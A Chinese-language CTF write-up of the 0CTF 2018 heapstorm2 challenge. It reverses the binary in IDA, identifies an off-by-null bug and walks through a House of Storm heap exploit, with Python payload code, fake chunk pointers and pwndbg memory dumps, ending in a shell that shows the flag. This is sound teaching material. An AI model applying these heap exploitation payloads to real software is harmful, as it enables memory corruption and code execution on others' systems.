# 0ctf-2018-heapstorm2

https://cloud.tencent.com/developer/article/1096957

## 前置知识
- mallopt int mallopt(int param,int value) param的取值分别为MMXFAST，value是以字节为单位。 MMXFAST:定义使用fastbins的内存请求大小的上限，小于该阈值的小块内存请求将不会使用fastbins获得内存，其缺省值为64。下面我们来将M_MXFAST设置为0，禁止使用fastbins 

源码:
https://code.woboq.org/userspace/glibc/malloc/malloc.h.html 

```c
#ifndef M_MXFAST
# define M_MXFAST  1    /* maximum request size for "fastbins" */
#endif

int __libc_mallopt (int param_number, int value)
{
  mstate av = &main_arena;
  int res = 1;

  if (__malloc_initialized < 0)
    ptmalloc_init ();
  __libc_lock_lock (av->mutex);

  LIBC_PROBE (memory_mallopt, 2, param_number, value);

  /* We must consolidate main arena before changing max_fast
     (see definition of set_max_fast).  */
  malloc_consolidate (av);

  switch (param_number)
    {
    case M_MXFAST:
      if (value >= 0 && value <= MAX_FAST_SIZE)
        {
          LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ());
          set_max_fast (value);
        }
      else
        res = 0;
      break;

    case M_TRIM_THRESHOLD:
      do_set_trim_threshold (value);
      break;

    case M_TOP_PAD:
      do_set_top_pad (value);
      break;

    case M_MMAP_THRESHOLD:
      res = do_set_mmap_threshold (value);
      break;

    case M_MMAP_MAX:
      do_set_mmaps_max (value);
      break;

    case M_CHECK_ACTION:
      do_set_mallopt_check (value);
      break;

    case M_PERTURB:
      do_set_perturb_byte (value);
      break;

    case M_ARENA_TEST:
      if (value > 0)
        do_set_arena_test (value);
      break;

    case M_ARENA_MAX:
      if (value > 0)
        do_set_arena_max (value);
      break;
    }
  __libc_lock_unlock (av->mutex);
  return res;
}
```
- 利用linux的/dev/urandom文件产生较好的随机数 
https://blog.csdn.net/stpeace/article/details/45829161 
```c
int randNum = 0;  
int fd = open("/dev/urandom", O_RDONLY);  
if(-1 == fd)  
{  
        printf("error\n");  
        return 1;  
}  

read(fd, (char *)&randNum, sizeof(int));  
close(fd);
```
- overlap
## 分析
### checksec
```
parallels@ubuntu:~/ctf/0ctf2018/heapstorm2$ checksec heapstorm2
[*] '/home/parallels/ctf/0ctf2018/heapstorm2/heapstorm2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
### 程序分析
#### 关闭fastbin的分配
```c
__int64 sub_BE6()
{
  ...
  if ( !mallopt(1, 0) )   //关闭fastbin的分配
    exit(-1);
  if ( mmap((void *)0x13370000, 0x1000u, 3, 34, -1, 0) != (void *)322371584 )
    exit(-1);   // 在0x13370000 mmap一块内存
```

对存放堆指针和size的地方进行随机化

fig01（进程与内存映射）

```txt
ps -ef | grep heapstorm
parallels 26895 ... ./heapstorm2
parallels 26971 ... grep --color=auto heapstorm

cat /proc/26895/maps
13370000-13371000 rw-p 00000000 00:00 0    [mmap]
...                                           [var]
...                                           [vdso]
...                                           [stack]
```

读入随机数前

```
pwndbg> b *555555554000+0x0000000000000CA6
Breakpoint 1 at 0x8159b10f76
pwndbg> r
Starting program: /home/parallels/ctf/0ctf2018/heapstorm2/heapstorm2 
...
...
Breakpoint *0x555555554000+0x0000000000000CA6
pwndbg> x /50gx 0x13370800
0x13370800:    0x0000000000000000  0x0000000000000000
0x13370810:    0x0000000000000000  0x0000000000000000
0x13370820:    0x0000000000000000  0x0000000000000000
0x13370830:    0x0000000000000000  0x0000000000000000
0x13370840:    0x0000000000000000  0x0000000000000000
0x13370850:    0x0000000000000000  0x0000000000000000
0x13370860:    0x0000000000000000  0x0000000000000000
0x13370870:    0x0000000000000000  0x0000000000000000
0x13370880:    0x0000000000000000  0x0000000000000000
0x13370890:    0x0000000000000000  0x0000000000000000
0x133708a0:    0x0000000000000000  0x0000000000000000
0x133708b0:    0x0000000000000000  0x0000000000000000
0x133708c0:    0x0000000000000000  0x0000000000000000
0x133708d0:    0x0000000000000000  0x0000000000000000
0x133708e0:    0x0000000000000000  0x0000000000000000
0x133708f0:    0x0000000000000000  0x0000000000000000
0x13370900:    0x0000000000000000  0x0000000000000000
0x13370910:    0x0000000000000000  0x0000000000000000
0x13370920:    0x0000000000000000  0x0000000000000000
0x13370930:    0x0000000000000000  0x0000000000000000
0x13370940:    0x0000000000000000  0x0000000000000000
0x13370950:    0x0000000000000000  0x0000000000000000
0x13370960:    0x0000000000000000  0x0000000000000000
0x13370970:    0x0000000000000000  0x0000000000000000
0x13370980:    0x0000000000000000  0x0000000000000000
```
读入随机数后

```
pwndbg> x /50gx 0x13370800
0x13370800:    0x72cec7f9b44fb49e  0x438137bc554b405e
0x13370810:    0x7a4f542a3248dba2  0x0000000000000000
0x13370820:    0x0000000000000000  0x0000000000000000
0x13370830:    0x0000000000000000  0x0000000000000000
0x13370840:    0x0000000000000000  0x0000000000000000
0x13370850:    0x0000000000000000  0x0000000000000000
```

```c
__int64 sub_BE6()
{
  int i; // [rsp+8h] [rbp-18h]
  int fd; // [rsp+Ch] [rbp-14h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(_bss_start, 0, 2, 0);
  alarm(0x3Cu);
  puts(
    "    __ __ _____________   __   __    ___    ____\n"
    "   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"
    "  / ,<  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"
    " / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"
    "/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n");
  puts("===== HEAP STORM II =====");
  if ( !mallopt(1, 0) )
    exit(-1);     //关闭fastbin的分配
  if ( mmap((void *)0x13370000, 0x1000u, 3, 34, -1, 0) != (void *)322371584 ) //在0x13370000分配一块内存
    exit(-1);
  fd = open("/dev/urandom", 0);
  if ( fd < 0 )
    exit(-1);
  if ( read(fd, (void *)0x13370800, 0x18u) != 24 )  //向(void *)0x13370800读入随机数，大小24字节
    exit(-1);
  close(fd);
  MEMORY[0x13370818] = MEMORY[0x13370810];
  for ( i = 0; i <= 15; ++i )
  {
    *(_QWORD *)(16 * (i + 2LL) + 0x13370800) = sub_BB0(322373632, 0);
    *(_QWORD *)(16 * (i + 2LL) + 0x13370808) = sub_BCC(322373632, 0);
  }
  return 322373632;
}
```

fig02（pwndbg 读入随机数后内存查看）

```txt
pwndbg> x /50gx 0x13370800
0x13370800:    0x72cec7f9b44fb49e  0x438137bc554b405e
0x13370810:    0x7a4f542a3248dba2  0x0000000000000000
0x13370820:    0x0000000000000000  0x0000000000000000
0x13370830:    0x0000000000000000  0x0000000000000000
0x13370840:    0x0000000000000000  0x0000000000000000
0x13370850:    0x0000000000000000  0x0000000000000000
```

用如图上数字1处的随机数去覆盖后面的16个的每一行的左八个字节(堆指针)。用如图上数字2处的随机数去覆盖后面的16个的每一行的右八个字节(size)。

用图上数字3处的随机数去覆盖数字4处。

#### 主函数

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = sub_BE6(a1, a2, a3);
  while ( 1 )
  {
    sub_D92();
    switch ( sub_1551() )
    {
      case 1LL:
        sub_DE6(v4);
        break;
      case 2LL:
        sub_F21(v4);
        break;
      case 3LL:
        sub_109B(v4);
        break;
      case 4LL:
        sub_11B5(v4);
        break;
      case 5LL:
        return 0;
      default:
        continue;
    }
  }
}
```

#### 添加

```c
void __fastcall sub_DE6(_QWORD *a1)
{
  int i; // [rsp+10h] [rbp-10h]
  int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !sub_BCC((__int64)a1, a1[2 * i + 5]) )
    {
      printf("Size: ");
      v2 = sub_1551();
      if ( v2 > 12 && v2 <= 4096 )
      {
        v3 = calloc(v2, 1u);
        if ( !v3 )
          exit(-1);
        a1[2 * i + 5] = sub_BCC((__int64)a1, v2); //a1[i+2].m_size=a1[0].m_size^input_size
        a1[2 * i + 4] = sub_BB0(a1, (__int64)v3); //a1[i+2].m_heap=a1[0].m_heap^heap_addr
        printf("Chunk %d Allocated\n", i);
      }
      else
      {
        puts("Invalid Size");
      }
      return;
    }
  }
}
```

#### 更新
有off by null漏洞
```c
int __fastcall sub_F21(_QWORD *a1)
{
  signed int v2; // [rsp+10h] [rbp-20h]
  int v3; // [rsp+14h] [rbp-1Ch]
  __int64 v4; // [rsp+18h] [rbp-18h]

  printf("Index: ");
  v2 = sub_1551();
  if ( (unsigned int)v2 >= 0x10 || !sub_BCC((__int64)a1, a1[2 * v2 + 5]) )
    return puts("Invalid Index");
  printf("Size: ");
  v3 = sub_1551();
  if ( v3 <= 0 || v3 > (unsigned __int64)(sub_BCC((__int64)a1, a1[2 * v2 + 5]) - 12) )
    return puts("Invalid Size");
  printf("Content: ");
  v4 = sub_BB0(a1, a1[2 * v2 + 4]);
  sub_1377(v4, v3);
  strcpy((char *)(v3 + v4), "HEAPSTORM_II");  //off-by-null
  return printf("Chunk %d Updated\n", v2);
}
```

#### 删除
```c
int __fastcall sub_109B(_QWORD *a1)
{
  void *v2; // rax
  signed int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  v3 = sub_1551();
  if ( (unsigned int)v3 >= 0x10 || !sub_BCC((__int64)a1, a1[2 * v3 + 5]) )
    return puts("Invalid Index");
  v2 = (void *)sub_BB0(a1, a1[2 * v3 + 4]);
  free(v2);                                   //free
  a1[2 * v3 + 4] = sub_BB0(a1, 0);            //指针“清零”
  a1[2 * v3 + 5] = sub_BCC((__int64)a1, 0);   //size“清零”（实际上都是异或后）
  return printf("Chunk %d Deleted\n", v3);
}
```
#### 显示

```c
int __fastcall sub_11B5(_QWORD *a1)
{
  unsigned __int64 v2; // rbx
  __int64 v3; // rax
  signed int v4; // [rsp+1Ch] [rbp-14h]

  if ( (a1[3] ^ a1[2]) != 322401073 )   //检查a1[1].m_size*a1[1].m_heap是否等于0x13377331，如果不等于就不输出
    return puts("Permission denied");
  printf("Index: ");
  v4 = sub_1551();
  if ( (unsigned int)v4 >= 0x10 || !sub_BCC((__int64)a1, a1[2 * v4 + 5]) )
    return puts("Invalid Index");
  printf("Chunk[%d]: ", v4);
  v2 = sub_BCC((__int64)a1, a1[2 * v4 + 5]);
  v3 = sub_BB0(a1, a1[2 * v4 + 4]);
  sub_14D4(v3, v2);   //输出size大小的heap内容
  return puts(byte_180A);
}
```

### 漏洞分析
在update的时候有一个off by null。

### 其他
之前做堆的题都不建结构体，全靠脑补…这次建一下，让反编译出来的好看一点。 

1.添加segment

fig03：IDA Program Segmentation 界面，右键 Add segment 新增段。

fig04：IDA Change segment attributes，Segment name=mmap，Start=0x13370000，End=0x13371000，32-bit，读写权限。

fig05（IDA 反编译片段）

```c
// 关闭 fastbin、固定地址 mmap 并从 /dev/urandom 读取 24 字节
if (!mallopt(1, 0)) exit(-1);
if (mmap((void *)0x13370000, 0x1000u, 3, 34, -1, 0) != (void *)0x13370000) exit(-1);
int fd = open("/dev/urandom", 0);
if (read(fd, (void *)0x13370800, 0x18u) != 24) exit(-1);
close(fd);
```

fig06：IDA 数据视图，`mmap:13370000` 段首部显示连续 `db ?` 未初始化字节。

2.建结构体

fig07（IDA 结构体定义概览）

```c
struct heap {
  unsigned long long m_heap;  // 指针异或基
  unsigned long long m_size;  // 大小异或基
};

struct global {
  heap chunk[18];              // 程序全局维护的 18 个槽
};

struct magic {
  unsigned long long magic_num1;
  unsigned long long magic_num2;
};
```

3.改函数参数

fig08（IDA 反编译：xor1）

```c
__int64 __fastcall xor1(heap *a1, __int64 a2) {
  return a1->m_heap ^ a2;
}
```

fig09（IDA 反编译：xor2）

```c
__int64 __fastcall xor2(heap *a1, __int64 a2) {
  return a2 ^ a1->m_size;
}
```

4.最后的修改结果

fig10（IDA 反编译：setup 主体）

```c
signed __int64 setup() {
  puts("===== HEAP STORM II =====");
  if (!mallopt(1, 0)) exit(-1);
  if (mmap((void *)0x13370000, 0x1000u, 3, 34, -1, 0) != (void *)0x13370000) exit(-1);
  int fd = open("/dev/urandom", 0);
  if (fd < 0) exit(-1);
  if (read(fd, (void *)0x13370800, 0x18u) != 24) exit(-1);
  close(fd);
  heap_mem.chunk[1].m_size = heap_mem.chunk[1].m_heap;
  for (int i = 0; i <= 15; ++i) {
    heap_mem.chunk[i + 2LL].m_heap = xor1(heap_mem.chunk, 0LL);
    heap_mem.chunk[i + 2LL].m_size = xor2(heap_mem.chunk, 0LL);
  }
  return 0x13370800LL;
}
```

## 利用
### shrink the chunk来overlap
前提：存在一个off-by-null漏洞（已满足） 目的：创造出overlap chunk，进而更改其他chunk中的内容 主要利用unsorted,small bin会unlink合并的特性来达到我们的目的。

1.伪造prev_size

```python
alloc(0x18)     #0
alloc(0x508)    #1
alloc(0x18)     #2
update(1, 'h'*0x4f0 + p64(0x500))   #set fake prev_size

alloc(0x18)     #3
alloc(0x508)    #4
alloc(0x18)     #5
update(4, 'h'*0x4f0 + p64(0x500))   #set fake prev_size
alloc(0x18)     #6
```

fig11（内存布局示意：在 #1 与 #4 尾部伪造 prev_size=0x500）

| 索引 | 块大小(size) | prev_size | 状态  | 备注 |
|---|---|---|---|---|
| 0 | 0x21  | -     | inuse | 对齐用小块 |
| 1 | 0x511 | 0x500 | inuse | update(1, 'h'*0x4f0 + p64(0x500)) |
| 2 | 0x21  | -     | inuse | - |
| 3 | 0x21  | -     | inuse | - |
| 4 | 0x511 | 0x500 | inuse | update(4, 'h'*0x4f0 + p64(0x500)) |
| 5 | 0x21  | -     | inuse | - |
| 6 | 0x21  | -     | inuse | - |

2.free 1,于是下一个chunk的inuse和prev_size将被设置。

图示灰色的地方代表被free掉，然后触发off by null，修改1的size。

```python
free(1)
update(0, 'h'*(0x18-12))    #off-by-one
```

fig12（内存布局示意：free(1) + off-by-null 缩小 size）

| 索引 | 块大小(size) | prev_size | 状态 | 备注 |
|---|---|---|---|---|
| 0 | 0x21  | -     | inuse | 触发 off-by-null |
| 1 | 0x500 | -     | free  | 原 0x511 → 0x500（清掉最低位） |
| 2 | 0x21  | 0x500 | inuse | 上一块不再 inuse，可触发向后合并 |
| 3 | 0x21  | -     | inuse | - |
| 4 | 0x511 | 0x500 | inuse | - |
| 5 | 0x21  | -     | inuse | - |
| 6 | 0x21  | -     | inuse | - |

3.将free的1再分配出来,然后再分配一块空间到原来的1中，注意大小不能刚好使得这个chunk和2相邻，否则会把2的inuse位置1，不能在后续触发unlink。

然后再free 2，就能触发unlink，然后1和7，overlap

```python
alloc(0x18)     #1
alloc(0x4d8)    #7
free(1)
free(2)         #backward consolidate
```

fig13（内存布局示意：重新分配 #1 与切出 #7）

| 索引 | 块大小(size) | prev_size | 状态  | 备注 |
|---|---|---|---|---|
| 0 | 0x21  | -     | inuse | - |
| 1 | 0x21  | -     | inuse | 重新占用小块 |
| 7 | 0x4e1 | -     | inuse | 从收缩后的 #1 切出 |
| 2 | 0x21  | 0x510/0x500 | inuse | 与 #7 相邻 |
| 3 | 0x21  | -     | inuse | - |
| 4 | 0x511 | -     | inuse | - |

fig14（内存布局示意：free(1) 后再 free(2) 触发 backward consolidate，形成 overlap）

| 索引 | 块大小(size) | prev_size | 状态 | 备注 |
|---|---|---|---|---|
| 0 | 0x21  | -     | inuse | - |
| 1 | 0x21  | -     | free  | 刚释放 |
| 7 | 0x4e1 | -     | inuse | 将与合并后的区域重叠 |
| 2 | 0x510/0x500 | - | free | backward consolidate 触发 unlink |
| 3 | 0x21  | -     | inuse | - |
| 4 | 0x511 | -     | inuse | - |

```
pwndbg> x /500gx 0x55f082807020
0x55f082807020:    0x49495f4d524f5453  0x0000000000000021
0x55f082807030:    0x00007f685fb20b78  0x00007f685fb20b78
0x55f082807040:    0x0000000000000020  0x00000000000004e0-->7
0x55f082807050:    0x0000000000000000  0x0000000000000000
...
0x55f082807520:    0x0000000000000000  0x524f545350414549
0x55f082807530:    0x0000000000000510  0x0000000000000020
```

fig15（pwndbg：unlink 后进入 unsortedbin 的大块，size=0x531）

```txt
pwndbg> unsortedbin
unsortedbin
all: 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757020
pwndbg> x /20gx 0x555555757020
0x555555757020: 0x49495f4d524f5453  0x0000000000000531
...
```

当free 2的时候，因为2是small bin的大小的缘故，所以会检测上一个chunk是否inused.

它会根据prev_size找到1，然后做unlink。

此时，unsortbin存放着这块大的chunk，所以下次malloc会用这一块先分配。

fig16（pwndbg：固定地址区附近字样，标出 0x56）

```txt
pwndbg> x /20gx 0x13370800-0x20
0x133707e0: ...
0x133707f0: ...  0x0000000000000056
...
```

fig17（利用成功后的交互）

```txt
$ ls
flag
heapstorm2
pow.py
$ cat flag
flag{Seize it, control it, and exploit it. Welcome to the House of Storm.}
```

fig18（whoami）

```txt
$ whoami
heapstorm2
```

```
pwndbg> unsortedbin 
unsortedbin
all: 0x555555757020 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757020 /* ' puUUU' */
pwndbg> x /20gx 0x555555757020
0x555555757020:    0x49495f4d524f5453  0x0000000000000531
0x555555757030:    0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x555555757040:    0x0000000000000000  0x0000000000000000
...
0x5555557570b0:    0x0000000000000000  0x0000000000000000
```
可以看出通过chunk shrink,实现了overlap。

```python
alloc(0x38)     #1
alloc(0x4e8)    #2
```
```
0x555555757020 FASTBIN {
  prev_size = 5280856823766668371, 
  size = 65, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757060 PREV_INUSE {
  prev_size = 0, 
  size = 1265, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
...
...
pwndbg> x /100gx 0x555555757020
0x555555757020:    0x49495f4d524f5453  0x0000000000000041-->1
0x555555757030:    0x0000000000000000  0x0000000000000000
0x555555757040:    0x0000000000000000  0x0000000000000000-->7
0x555555757050:    0x0000000000000000  0x0000000000000000
0x555555757060:    0x0000000000000000  0x00000000000004f1-->2
0x555555757070:    0x0000000000000000  0x0000000000000000
0x555555757080:    0x0000000000000000  0x0000000000000000
0x555555757090:    0x0000000000000000  0x0000000000000000
0x5555557570a0:    0x0000000000000000  0x0000000000000000
0x5555557570b0:    0x0000000000000000  0x0000000000000000
0x5555557570c0:    0x0000000000000000  0x0000000000000000
```
重复一遍之前的过程，再次构造overlap

```python
free(4)
update(3, 'h'*(0x18-12))    #off-by-one
alloc(0x18)     #4
alloc(0x4d8)    #8
free(4)
free(5)         #backward consolidate
alloc(0x48)     #4
```
然后4和8交叠。

```
pwndbg> x /50gx 0x555555757570
0x555555757570:    0x49495f4d524f5453  0x0000000000000021
0x555555757580:    0x0000000000000000  0x0000000000000000
0x555555757590:    0x0000000000000000  0x00000000000004e1-->8
0x5555557575a0:    0x0000000000000000  0x0000000000000000
0x5555557575b0:    0x0000000000000000  0x0000000000000000
....
....
....
unlink之后
....
....
....
pwndbg> x /50gx 0x555555757570
0x555555757570:    0x49495f4d524f5453  0x0000000000000051-->4
0x555555757580:    0x0000000000000000  0x0000000000000000
0x555555757590:    0x0000000000000000  0x0000000000000000-->8
0x5555557575a0:    0x0000000000000000  0x0000000000000000
0x5555557575b0:    0x0000000000000000  0x0000000000000000
0x5555557575c0:    0x0000000000000000  0x00000000000004e1
0x5555557575d0:    0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x5555557575e0:    0x0000000000000000  0x0000000000000000
0x5555557575f0:    0x0000000000000000  0x0000000000000000
0x555555757600:    0x0000000000000000  0x0000000000000000
0x555555757610:    0x0000000000000000  0x0000000000000000
```
利用unsorted bin中的chunk插入到large bin写数据，绕过对unsortbin中chunk的size大小的检查
```python
free(2)
alloc(0x4e8)    #2
free(2)


storage = 0x13370000 + 0x800
fake_chunk = storage - 0x20


p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
p1 += p64(0) + p64(fake_chunk)      #bk
update(7, p1)


p2 = p64(0)*4 + p64(0) + p64(0x4e1) #size
p2 += p64(0) + p64(fake_chunk+8)    #bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
p2 += p64(0) + p64(fake_chunk-0x18-5)   #bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
update(8, p2)
```
free 2前

```
pwndbg> unsortedbin 
unsortedbin
all: 0x5555557575c0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x5555557575c0
```
free 2后

```
pwndbg> unsortedbin 
unsortedbin
all: 0x555555757060 —▸ 0x5555557575c0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757060 /* '`puUUU' */
```
将2再分配出来，这时0x5555557575c0掉链，进入large bins中，再free 2，0x555555757060再次进入unsortedbin。

```
pwndbg> unsortedbin 
unsortedbin
all: 0x555555757060 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757060 /* '`puUUU' */
pwndbg> largebins 
largebins
0x400: 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x7ffff7dd1f68
0x440: 0x7ffff7dd1f78 (main_arena+1112) ◂— 0x7ffff7dd1f78
0x480: 0x7ffff7dd1f88 (main_arena+1128) ◂— 0x7ffff7dd1f88
0x4c0: 0x5555557575c0 —▸ 0x7ffff7dd1f98 (main_arena+1144) ◂— 0x5555557575c0
```
然后要fake 0x555555757060的后向指针。

```python
storage = 0x13370000 + 0x800
fake_chunk = storage - 0x20

p1 = p64(0)*2 + p64(0) + p64(0x4f1) #size
p1 += p64(0) + p64(fake_chunk)      #bk
update(7, p1)
```
fake前

```
pwndbg> x /20gx 0x555555757020
0x555555757020:    0x49495f4d524f5453  0x0000000000000041
0x555555757030:    0x0000000000000000  0x0000000000000000
0x555555757040:    0x0000000000000000  0x0000000000000000
0x555555757050:    0x0000000000000000  0x0000000000000000
0x555555757060:    0x0000000000000000  0x00000000000004f1
0x555555757070:    0x00007ffff7dd1b78  0x00007ffff7dd1b78
0x555555757080:    0x0000000000000000  0x0000000000000000
0x555555757090:    0x0000000000000000  0x0000000000000000
```
fake后

```
pwndbg> x /20gx 0x555555757020
0x555555757020:    0x49495f4d524f5453  0x0000000000000041
0x555555757030:    0x0000000000000000  0x0000000000000000
0x555555757040:    0x0000000000000000  0x0000000000000000
0x555555757050:    0x0000000000000000  0x0000000000000000
0x555555757060:    0x0000000000000000  0x00000000000004f1
0x555555757070:    0x0000000000000000  0x00000000133707e0
0x555555757080:    0x524f545350414548  0x0000000049495f4d
0x555555757090:    0x0000000000000000  0x0000000000000000
0x5555557570a0:    0x0000000000000000  0x0000000000000000
```
可以看出bk指针被改写。

然后fake 

```python
p2 = p64(0)*4 + p64(0) + p64(0x4e1) # size
p2 += p64(0) + p64(fake_chunk+8)    # bk, for creating the "bk" of the faked chunk to avoid crashing when unlinking from unsorted bin
p2 += p64(0) + p64(fake_chunk-0x18-5)   # bk_nextsize, for creating the "size" of the faked chunk, using misalignment tricks
update(8, p2)
```
fake前

```
pwndbg> x/20gx 0x555555757590
0x555555757590:    0x0000000000000000  0x0000000000000000
0x5555557575a0:    0x0000000000000000  0x0000000000000000
0x5555557575b0:    0x0000000000000000  0x0000000000000000
0x5555557575c0:    0x0000000000000000  0x00000000000004e1
0x5555557575d0:    0x00007ffff7dd1f98  0x00007ffff7dd1f98
0x5555557575e0:    0x00005555557575c0  0x00005555557575c0
0x5555557575f0:    0x0000000000000000  0x0000000000000000
0x555555757600:    0x0000000000000000  0x0000000000000000
0x555555757610:    0x0000000000000000  0x0000000000000000
```
fake后

```
pwndbg> x/20gx 0x555555757590
0x555555757590:    0x0000000000000000  0x0000000000000000
0x5555557575a0:    0x0000000000000000  0x0000000000000000
0x5555557575b0:    0x0000000000000000  0x0000000000000000
0x5555557575c0:    0x0000000000000000  0x00000000000004e1
0x5555557575d0:    0x0000000000000000  0x00000000133707e8
0x5555557575e0:    0x0000000000000000  0x00000000133707c3
0x5555557575f0:    0x524f545350414548  0x0000000049495f4d
0x555555757600:    0x0000000000000000  0x0000000000000000
0x555555757610:    0x0000000000000000  0x0000000000000000
0x555555757620:    0x0000000000000000  0x0000000000000000
```

```python
try:
    # if the heap address starts with "0x56", you win
    alloc(0x48)     #2
except EOFError:
    # otherwise crash and try again
    r.close()
    continue
```
当再分配一个chunk的时候，会先检查unsorted bin中有没有合适的，如果没有就把unsortbin中的chunk插入large bin中。

看源码：

```c
else
{
  victim_index = largebin_index (size);
  bck = bin_at (av, victim_index);
  fwd = bck->fd;
  ....
  ....
  ....
  // 如果size<large bin中最后一个chunk即最小的chunk，就直接插到最后
      if ((unsigned long) (size)
          < (unsigned long) chunksize_nomask (bck->bk))
        {
          fwd = bck;
          bck = bck->bk;
          victim->fd_nextsize = fwd->fd;
          victim->bk_nextsize = fwd->fd->bk_nextsize;
          fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
        }
      else
        {
          assert (chunk_main_arena (fwd));
    // 否则正向遍历，fwd起初是large bin第一个chunk，也就是最大的chunk。
  // 直到满足size>=large bin chunk size
          while ((unsigned long) size < chunksize_nomask (fwd))
            {
              fwd = fwd->fd_nextsize;//fd_nextsize指向比当前chunk小的下一个chunk
              assert (chunk_main_arena (fwd));
            }
          if ((unsigned long) size
              == (unsigned long) chunksize_nomask (fwd))
            /* Always insert in the second position.  */
            fwd = fwd->fd;
          else
      // 插入
            {
              victim->fd_nextsize = fwd;
              victim->bk_nextsize = fwd->bk_nextsize;
              fwd->bk_nextsize = victim;
              victim->bk_nextsize->fd_nextsize = victim;
            }
          bck = fwd->bk;
        }
    }
  else
    victim->fd_nextsize = victim->bk_nextsize = victim;
}
mark_bin (av, victim_index);
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```
当找到插入的位置后，看源码里具体的插入操作。

注意large bin要维持两个双向链表，多了一个chunk size链表，所以要在两个链表中插入。

```c
victim->fd_nextsize = fwd;
victim->bk_nextsize = fwd->bk_nextsize;
fwd->bk_nextsize = victim;
victim->bk_nextsize->fd_nextsize = victim;
....
....
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;
```

在此题中，fwd只可能是我们放入large bin的唯一一个chunk，而它的bk_nextsize和bk都是我们可以控制的（如上一步的改写）

```c
victim->bk_nextsize = fwd->bk_nextsize;
victim->bk_nextsize->fd_nextsize=victim
```